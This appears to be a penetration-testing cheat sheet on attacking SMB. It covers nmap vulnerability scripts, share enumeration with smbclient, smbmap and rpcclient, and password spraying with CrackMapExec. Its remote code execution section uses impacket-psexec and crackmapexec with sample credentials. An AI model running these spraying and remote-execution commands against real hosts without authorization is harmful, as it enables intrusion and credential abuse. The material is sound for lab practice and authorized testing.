# SMB \[139,445]

## Nmap Scanning

### **Getting version information**

```
nmap -n -v -Pn -p139,445 -sV 192.168.0.101
```

### **Scan with NSE Scripts**

```
nmap 192.168.0.101 --script=smb-enum*
nmap 192.168.0.101 --script=smb-vuln*
nmap 192.1688.0.101 --script=smb-os*
```

## List Available Shares

### smbclient

```
smbclient -L \\\\192.168.1.101\\
# Will list all shares

smbclient -L \\$ip --option='client min protocol=NT1'
# if getting error "protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED"

smbclient //HOST/PATH -c 'recurse;ls'
# List all files recursly
```

### smbmap

```
smbmap -H $ip
# Will list all shares with available permissions

smbmap -H $ip -R $sharename
# Recursively list dirs, and files

smbmap -u '' -p '' -H $ip 
smbmap -u guest -p '' -H $ip
smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1
# With credentials

smbmap -H 10.129.14.128 --download "notes\note.txt"
# Download

smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
# Upload
```

### Nmap

```
nmap --script smb-enum-shares -p 139,445 $ip
```

**Windows CMD - Net Use**

```cmd-session
C:\htb> net use n: \\192.168.220.129\Finance /user:plaintext Password123
```

> to host a server use impacket with username and password flags.

**Windows CMD - DIR**

```cmd-session
C:\htb> dir n: /a-d /s /b | find /c ":\"

29302
```

<table data-header-hidden><thead><tr><th width="113"></th><th></th></tr></thead><tbody><tr><td><strong>Syntax</strong></td><td><strong>Description</strong></td></tr><tr><td><code>dir</code></td><td>Application</td></tr><tr><td><code>n:</code></td><td>Directory or drive to search</td></tr><tr><td><code>/a-d</code></td><td><code>/a</code> is the attribute and <code>-d</code> means not directories</td></tr><tr><td><code>/s</code></td><td>Displays files in a specified directory and all subdirectories</td></tr><tr><td><code>/b</code></td><td>Uses bare format (no heading information or summary)</td></tr></tbody></table>

### rpcclient

```shell-session
$ rpcclient -U'%' 10.10.110.17
```

```shell-session
rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

### Enum4linux

```shell-session
enum4linux 10.10.11.45 -A
enum4linux -u 'guest' -p '' -a <ip>
```

## Brute Force

### CrackMapExec

```shell-session
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

## **Remote Code Execution (RCE)**

### Impacket-psexec

```shell-session
impacket-psexec administrator:'Password123!'@10.10.110.17
```

### CrackMapExec

```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```







